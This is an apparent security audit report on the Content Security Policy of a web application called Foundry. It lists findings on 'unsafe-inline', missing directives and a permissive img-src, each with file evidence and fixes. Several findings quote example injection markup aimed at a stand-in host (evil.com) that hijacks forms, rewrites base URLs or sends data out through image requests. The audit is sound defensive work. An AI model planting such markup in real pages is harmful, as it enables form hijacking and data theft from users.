# Lens 112 — Content Security Policy Strictness

**Auditor Persona:** Security Depth (Tier 3)
**Date:** 2026-04-16
**Scope:** CSP headers in security-headers.ts, unsafe-inline necessity, directive completeness

---

## Executive Summary

Foundry's CSP is present and covers the major directives, but includes `'unsafe-inline'` in both `script-src` and `style-src`, which significantly weakens protection against XSS. The `'unsafe-inline'` for scripts is particularly dangerous — it means any injected inline script (via a template injection or DOM XSS) will execute. Given that Foundry uses Hono's `html` tagged templates with auto-escaping, the XSS risk is mitigated at the rendering layer, but the CSP provides no defense-in-depth. The policy also lacks `form-action`, `base-uri`, and `object-src` directives.

---

## Findings

### CSP-01 — 'unsafe-inline' in script-src defeats XSS protection (Severity: High)

**Description:** The CSP allows `'unsafe-inline'` for scripts, which means any inline `<script>` tag will execute, whether intentional or injected. This removes CSP's primary value as an XSS mitigation layer.

**Evidence:**
- `src/middleware/security-headers.ts:26`: `"script-src 'self' 'unsafe-inline' https://unpkg.com https://*.clerk.accounts.dev"`.
- The `'unsafe-inline'` is needed because of inline `<script>` blocks throughout the application:
  - `src/views/layout.ts:123-160`: Command palette JavaScript (inline).
  - `src/views/layout.ts:162-165`: Service worker registration (inline).
  - `src/routes/auth/clerk.ts:36-51`: Clerk initialization (inline).
  - `src/routes/public/landing.ts:19`: Clerk user check (inline).

**Remediation:** 
1. Extract all inline JavaScript into external `.js` files served from `/static/`.
2. Replace `'unsafe-inline'` with nonce-based CSP: `'nonce-{random}'` generated per request.
3. If migration is too large, use `'strict-dynamic'` with a nonce on the entry-point script.

---

### CSP-02 — 'unsafe-inline' in style-src (Severity: Medium)

**Description:** Inline styles are allowed via `'unsafe-inline'` in `style-src`. While less dangerous than script `unsafe-inline`, this allows CSS injection attacks (data exfiltration via CSS selectors, UI redressing).

**Evidence:**
- `src/middleware/security-headers.ts:27`: `"style-src 'self' 'unsafe-inline'"`.
- Inline styles are used extensively throughout templates (e.g., `style="padding:4rem 1rem 3rem;"` on almost every component).

**Remediation:** Moving away from inline styles would require significant refactoring. Lower priority than fixing script `unsafe-inline`. Consider using a CSS-in-JS approach with hashes, or accept the risk given the server-rendered architecture.

---

### CSP-03 — Missing form-action directive (Severity: Medium)

**Description:** No `form-action` directive is set. Without it, forms can submit to any URL, enabling form hijacking attacks if an attacker can inject a `<form action="https://evil.com">` element.

**Evidence:**
- `src/middleware/security-headers.ts:24-32`: No `form-action` directive in the CSP.
- Multiple forms use `method="POST"` with server-relative action URLs.

**Remediation:** Add `form-action 'self'` to restrict form submissions to the same origin.

---

### CSP-04 — Missing base-uri directive (Severity: Medium)

**Description:** No `base-uri` directive is set. An attacker who can inject a `<base href="https://evil.com">` tag could redirect all relative URLs (including form actions and script sources) to a malicious server.

**Evidence:**
- `src/middleware/security-headers.ts:24-32`: No `base-uri` directive.

**Remediation:** Add `base-uri 'self'` to the CSP.

---

### CSP-05 — Missing object-src directive (Severity: Low)

**Description:** No `object-src` directive is set. The `default-src 'self'` provides a fallback, but explicitly setting `object-src 'none'` is best practice to prevent Flash/plugin-based attacks.

**Evidence:**
- `src/middleware/security-headers.ts:25`: `"default-src 'self'"` covers object-src by default, but explicit is better.

**Remediation:** Add `object-src 'none'` explicitly.

---

### CSP-06 — img-src allows all HTTPS (Severity: Low)

**Description:** `img-src 'self' data: https:` allows images from any HTTPS source. While not a direct security risk, it enables potential data exfiltration via image requests (`<img src="https://evil.com/track?data=...">`).

**Evidence:**
- `src/middleware/security-headers.ts:28`: `"img-src 'self' data: https:"`.

**Remediation:** Restrict to specific known image sources, or accept the risk (images are common from GitHub avatars, etc.).

---

## Embarrassment Test

A new vulnerability in Hono's template escaping allows injection of an inline `<script>` tag. Because CSP allows `'unsafe-inline'`, the injected script executes, stealing Clerk session tokens for every affected user. With a stricter CSP, the script would have been blocked. **Likelihood: The whole point of CSP is defense-in-depth for exactly this scenario.**

## Pride Test

The CSP exists and covers the primary directives (`default-src`, `script-src`, `style-src`, `img-src`, `connect-src`, `frame-src`, `font-src`). Many applications of this size have no CSP at all. The X-Frame-Options, HSTS, and Permissions-Policy headers are all correctly configured.

## Distinct-Value Declaration

This lens provides a complete CSP gap analysis with specific remediation paths. The key insight is that `'unsafe-inline'` in `script-src` is driven by 4 specific inline script blocks that could be extracted into external files, making a strict CSP achievable.

## Tenancy-Critical Flag

**Yes.** A CSP bypass that enables XSS affects all tenants because the CSP is global. However, cross-tenant data access is still prevented by server-side ownership scoping.
